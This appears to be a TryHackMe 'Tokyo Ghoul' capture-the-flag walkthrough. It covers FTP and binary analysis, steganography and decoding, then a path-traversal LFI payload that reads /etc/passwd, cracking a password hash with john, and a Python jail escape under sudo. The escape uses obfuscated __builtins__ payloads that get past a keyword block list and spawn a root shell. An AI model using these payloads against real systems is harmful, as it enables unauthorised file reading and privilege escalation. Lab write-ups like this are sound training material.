---
layout: post
title: TryHackMe - Tokyo Ghoul
date: 2023-08-31 01:32:00 +0700
tags: [security, web, hash, lfi]
toc: true
---

<p class="message">Help kaneki escape jason room</p>

> **Instructions**
>
> This room took a lot of inspiration from [psychobreak](https://tryhackme.com/room/psychobreak) , and it is based on Tokyo Ghoul anime.
>
> Alert: This room can contain some spoilers 'only s1 and s2 ' so if you are interested to watch the anime, wait till you finish the anime and come back to do the room
>
> The machine will take some time, just go grab some water or make a coffee.

## Task 2: Where am I?

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn tokyoghoul.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 12:46 EDT
Nmap scan report for tokyoghoul.thm (10.10.128.45)
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 21,22,80 tokyoghoul.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 12:46 EDT
Nmap scan report for tokyoghoul.thm (10.10.128.45)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.63.75
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa9e38d395df55ea14c949d80a61db5e (RSA)
|   256 adb7a75e36cb32a090908e0b98308a97 (ECDSA)
|_  256 a2a2c81496c5206885e541d0aa538bbd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome To Tokyo goul
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (99%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   184.49 ms 10.9.0.1
2   184.57 ms tokyoghoul.thm (10.10.128.45)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.43 seconds
```

## Task 3: Planning to escape

Open web-browser and access the main page of the target’s IP:

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled.png)

Click on the link at the bottom of the page:

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%201.png)

View the page source > Read the comment line:

{% highlight html linenos %}

<html>
  <head>
    <title>Jason room</title>
    <link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css" />
  </head>
  <body>
    <h1 style="text-align: center;">Help him</h1>
    <div class="center-wrapper">
      <img src="jason.gif" />
    </div>

    <!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->

  </body>
</html>
{% endhighlight %}

From the nmap scan, the **ftp** service allows the _anonymous_ _login_ → Let’s login through **FTP**:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ ftp tokyoghoul.thm
Connected to tokyoghoul.thm.
220 (vsFTPd 3.0.3)
Name (tokyoghoul.thm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||42821|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
```

Access `need_Help?` directory and list it:

```
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||43513|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
```

Transfer file `Aogiri_tree.txt` to the local:

```
ftp> get Aogiri_tree.txt
local: Aogiri_tree.txt remote: Aogiri_tree.txt
229 Entering Extended Passive Mode (|||48864|)
150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
100% |***********************************************************************|   480        1.68 MiB/s    00:00 ETA
226 Transfer complete.
480 bytes received in 00:00 (2.53 KiB/s)
```

Keep continue with the `Talk_with_me` and transfer all the files inside:

```
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||44201|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> mget *
mget need_to_talk [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||43403|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
100% |***********************************************************************| 17488       84.49 KiB/s    00:00 ETA
226 Transfer complete.
17488 bytes received in 00:00 (44.02 KiB/s)
229 Entering Extended Passive Mode (|||43391|)
150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
100% |***********************************************************************| 46674      122.56 KiB/s    00:00 ETA
226 Transfer complete.
46674 bytes received in 00:00 (81.87 KiB/s)
```

There is nothing left. Get back to the local machine and analyze the transferred files!

**Aogiri_tree.txt**

```
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will.
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```

It just a simple note.

**need_to_talk**

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ file need_to_talk
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
```

It is the **ELF executable** file → Set the `+x` to the file and try to execute it to see what would happen:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ chmod +x need_to_talk

┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ ls -l need_to_talk
-rwxr-xr-x 1 kali kali 17488 Jan 23  2021 need_to_talk
```

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ ./need_to_talk
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> yes
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
```

The `yes` answer is not correct (definitely!). Luckily, the last-line message tells me what to do → use `rabin2 -z`:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ rabin2 -z need_to_talk
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 9   10   .rodata ascii [REDACTED]
1   0x00002018 0x00002018 37  38   .rodata ascii Hey Kaneki finnaly you want to talk \n
2   0x00002040 0x00002040 82  83   .rodata ascii Unfortunately before I can give you the kagune you need to give me the paraphrase\n
3   0x00002098 0x00002098 35  36   .rodata ascii Do you have what I'm looking for?\n\n
4   0x000020c0 0x000020c0 47  48   .rodata ascii Good job. I believe this is what you came for:\n
5   0x000020f0 0x000020f0 51  52   .rodata ascii Hmm. I don't think this is what I was looking for.\n
6   0x00002128 0x00002128 36  37   .rodata ascii Take a look inside of me. rabin2 -z\n
```

Except all the _strings_ (from `1` → `6` **nth**) that have appeared since the file executed. The first one (`0` **nth**) have not → Try it:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ ./need_to_talk
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> [REDACTED]
Good job. I believe this is what you came for:
You_found_1t
```

Another way to explore the right key for the execution is using `ghidra` or `r2`.

With `ghidra`: Access the **Symbol Tree** section > select function `print_flag()` > Decode the hex string inside:

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%202.png)

With `r2`:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ r2 need_to_talk
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
[0x000010f0]> aac
[0x000010f0]> afl
0x000010e0    1 6            sym.imp.__cxa_finalize
0x00001120    4 41   -> 34   sym.deregister_tm_clones
0x0000122d    4 101          sym.print_intro
0x000012e9    4 125          sym.check_password
0x00001292    4 87           sym.slow_type
0x00001366    1 77           sym.print_flag
0x000010b0    1 6            sym.imp.malloc
0x00001050    1 6            sym.imp.puts
0x00001030    1 6            sym.imp.free
0x00001070    1 6            sym.imp.setbuf
0x000010c0    1 6            sym.imp.sleep
0x00001040    1 6            sym.imp.putchar
0x000010d0    1 6            sym.imp.usleep
0x00001080    1 6            sym.imp.printf
0x00001090    1 6            sym.imp.fgets
0x00001060    1 6            sym.imp.strlen
0x000010a0    1 6            sym.imp.strcmp
0x00001000    3 23           sym._init
[0x000010f0]> s sym.print_flag
[0x00001366]> pdf
```

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%203.png)

**rize_and_kaneki.jpg**

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%204.png)

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ exiftool rize_and_kaneki.jpg
ExifTool Version Number         : 12.57
File Name                       : rize_and_kaneki.jpg
Directory                       : .
File Size                       : 47 kB
File Modification Date/Time     : 2021:01:23 17:26:44-05:00
File Access Date/Time           : 2023:08:30 12:49:47-04:00
File Inode Change Date/Time     : 2023:08:30 12:49:47-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1024
Image Height                    : 576
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1024x576
Megapixels                      : 0.590
```

Use `steghide` to extract the hidden data within the passphrase is the key for the **need_to_talk**’s execution:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ steghide --extract -sf rize_and_kaneki.jpg
Enter passphrase:
wrote extracted data to "yougotme.txt".
```

## Task 4: What Rize is trying to say?

Read the note that has been extracted:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ cat yougotme.txt
haha you are so smart kaneki but can you talk my code

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..

if you can talk it allright you got my secret directory
```

It is **MORSE** code!! I copy the MORSE into another text file:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ cat encoded_morse.txt
..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..
```

Then use `more2ascii` tool to decode the MORSE:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ morse2ascii encoded_morse.txt

MORSE2ASCII 0.2
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- open encoded_morse.txt

- decoded morse data:
5a  44  46  79  4d  32  4d  33  4d  48  4a  35  58  32  4e  6c  62  6e  52  6c  63  67  3d  3d
```

Use `xxd` to decode the hex output:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ echo "5a  44  46  79  4d  32  4d  33  4d  48  4a  35  58  32  4e  6c  62  6e  52  6c  63  67  3d  3d" | xxd -r -p
ZDFyM2M3MHJ5X2NlbnRlcg==
```

Finally, decode the output with **base64**:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ echo "ZDFyM2M3MHJ5X2NlbnRlcg==" | base64 -d
[REDACTED]
```

I use the output as a path/directory and append it with the original target’s domain:

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%205.png)

OK! As you wish! Use `gobuster` to enumerate the directories:

{% highlight html linenos %}
┌──(kali㉿kali)-[~/Wordlists] └─$ gobuster dir -w directory-list-2.3-medium.txt
-t 50 --no-error -u http://tokyoghoul.thm/[REDACTED]/
=============================================================== Gobuster v3.6 by
OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
=============================================================== [+] Url:
http://tokyoghoul.thm/[REDACTED]/ [+] Method: GET [+] Threads: 50 [+] Wordlist:
directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent:
gobuster/3.6 [+] Timeout: 10s
=============================================================== Starting
gobuster in directory enumeration mode
=============================================================== /[REDACTED]
(Status: 301) [Size: 333] [--> http://tokyoghoul.thm/[REDACTED]/[REDACTED]/]
{% endhighlight %}

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%206.png)

View the page source and I regconise that the options **NO** and **YES** both have the same value:

{% highlight html linenos %}

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
 <p><b>Welcome Kankei-Ken</b><br><br>So you are here , you make the desision , you really want the power ?
 Will you accept me?
 Will accept your self as a ghoul?</br></p>
    <img src='https://i.imgur.com/9joyFGm.gif'>    </body>
</html>
{% endhighlight %}

I click on one of them and it displays nothing:

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%207.png)

However, the `?view=` parameter seems related to the **LFI** or **Path Traversal**. So I simply modify the argument _flower.gif_ to another one (for example: _/etc/passwd_):

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%208.png)

Nothing happen! I try with other payloads and this one return another thing instead of blank space:

```
../../../../../../../etc/passwd
```

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%209.png)

Then, I encode the payload with **URL-encode** and use **Burpsuite** to re-send the request:

```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd
```

![Untitled](/assets/Tokyo%20Ghoul%20images/Untitled%2010.png)

Scroll down and I get the user’s creds:

```
[REDACTED]:$6$Tb/euwmK$OXA.[REDACTED]..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:
```

Then I paste it into a text file called `creds.txt` and use `john` to crack the hash-password:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ nano creds.txt

┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ cat creds.txt
[REDACTED]:$6$Tb/euwmK$OXA.[REDACTED]..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:

┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ john -w=~/Wordlists/rockyou.txt creds.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]      ([REDACTED])
1g 0:00:00:00 DONE (2023-08-30 14:17) 1.851g/s 2844p/s 2844c/s 2844C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Task 5: Fight Jason

I’ve gone so far! It’s only a few steps left to defeat the Jason. Let’s use the previous creds to access the target system through **SSH**:

```
┌──(kali㉿kali)-[~/TryHackMe/TokyoGhoul]
└─$ ssh [REDACTED]@tokyoghoul.thm
The authenticity of host 'tokyoghoul.thm (10.10.185.245)' can't be established.
ED25519 key fingerprint is SHA256:oo//h4aM0BBJSlV7s7eejBvC/3yzDDk/PL7KIK6mewQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'tokyoghoul.thm' (ED25519) to the list of known hosts.
[REDACTED]@tokyoghoul.thm's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 23 22:29:38 2021 from 192.168.77.1
[REDACTED]@vagrant:~$ id
uid=1001([REDACTED]) gid=1001([REDACTED]) groups=1001([REDACTED])
[REDACTED]@vagrant:~$
```

List the current directory and easily get the user flag

```
[REDACTED]@vagrant:~$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 23  2021 .
drwxr-xr-x 4 root root 4096 Jan 23  2021 ..
-rw-r--r-- 1 root root  588 Jan 23  2021 jail.py
-rw-r--r-- 1 root root   33 Jan 23  2021 user.txt
[REDACTED]@vagrant:~$ cat user.txt
[REDACTED]
```

There’s only the final section - the root flag. I type `sudo -l` to view the allowed com of the current user:

```
[REDACTED]@vagrant:~$ sudo -l
[sudo] password for [REDACTED]:
Matching Defaults entries for [REDACTED] on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User [REDACTED] may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/[REDACTED]/jail.py
```

The current user could use `python3` to execute the file `jail.py` within **sudo rights →** Let’s see what does the `jail.py` do?

{% highlight python linenos %}
#! /usr/bin/python3
#-_- coding:utf-8 -_-
def main():
print("Hi! Welcome to my world kaneki")
print("========================================================================")
print("What ? You gonna stand like a chicken ? fight me Kaneki")
text = input('>>> ')
for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
if keyword in text:
print("Do you think i will let you do this ??????")
return;
else:
exec(text)
print('No Kaneki you are so dead')
if **name** == "**main**":
main()
{% endhighlight %}

From the script, I can see that if the input value is not in the _keyword_ list → then it would execute through the `exec()` function. But how could I read the root flag which is definitely restricted access without using the restricted _keyword_ above (such as `os` or `system`)?

After googling about **Python Jail Escape**, I explore this source which is exactly the same with my situation. Therefore, I modify the payload to my own:

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')

# Origin: import os; os.system('cat /root/root.txt')
```

```
[REDACTED]@vagrant:~$ sudo /usr/bin/python3 /home/[REDACTED]/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
[REDACTED]
No Kaneki you are so dead
```

Optionally, this payload could be used to establish the root shell:

```
__builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')

# Origin: import pty;pty.spawn('/bin/bash')
```

```
[REDACTED]@vagrant:~$ sudo /usr/bin/python3 /home/[REDACTED]/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
root@vagrant:~# id
uid=0(root) gid=0(root) groups=0(root)
root@vagrant:~# pwd
/home/[REDACTED]
root@vagrant:~# cd /root
root@vagrant:/root# cat root.txt
[REDACTED]
```
